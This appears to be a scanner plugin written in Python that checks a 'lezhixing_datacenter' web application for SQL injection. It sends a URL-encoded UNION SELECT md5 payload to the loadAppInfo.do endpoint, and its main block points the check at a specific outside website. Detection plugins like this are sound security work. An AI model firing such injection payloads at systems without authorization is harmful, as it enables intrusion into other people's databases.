#!/usr/bin/python
#-*- encoding:utf-8 -*-
#__author__ = '1c3z'
#ref http://www.wooyun.org/bugs/wooyun-2014-085320

def assign(service, arg):
    if service == "lezhixing_datacenter":
        return True, arg

def audit(arg):
    payload = 'datacenter/downloadApp/loadAppInfo.do?1414310370856&appId=f889bbb1102247d2ae00c85dbdd51ea8&versionType=%27%20UNION%20ALL%20SELECT%20%20md5%28%27xxx%27%29%20%20--%20%20'
    url = arg + payload
    code, head,res, errcode, _ = curl.curl2(url)
    if code == 200 and 'f561aaf6ef0bf14d4208bb46a4ccb3ad' in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('lezhixing_datacenter', 'http://www.dxyzzx.com/')[1])